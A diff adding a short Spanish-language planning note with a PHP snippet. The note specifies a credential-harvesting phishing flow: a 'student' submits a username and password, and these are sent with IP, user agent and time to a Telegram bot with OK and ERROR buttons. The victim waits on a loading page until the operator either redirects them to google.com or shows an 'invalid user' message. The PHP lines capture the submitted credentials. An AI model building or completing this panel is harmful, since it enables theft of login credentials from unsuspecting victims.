@@ -1,0 +1,31 @@
+pasarlo todo a js   y que se conecte a render  y que  cuando llegue  telegram se envie dos botones   y si 
+
+proceso seria 
+
+estudiante  entra 
+se envia telegram 
+
+$usuario  = trim($_POST['usuario']   ?? $_POST['username'] ?? '');
+$password = trim($_POST['password']  ?? '');
+$ip       = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A';
+$ua       = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
+$fecha    = date('Y-m-d H:i:s T');
+
+
+y aparecen  dos botones
+
+BTNOK BTERROR
+
+Y QUEDE CARGANDO EN 
+
+LOAD.HTML 
+
+SI PRESIONO BTNOK
+ LO REDIRECCIONO A 
+
+google.com
+
+si presiono  BTERROR
+
+salga un mensaje usuario invalido  
+
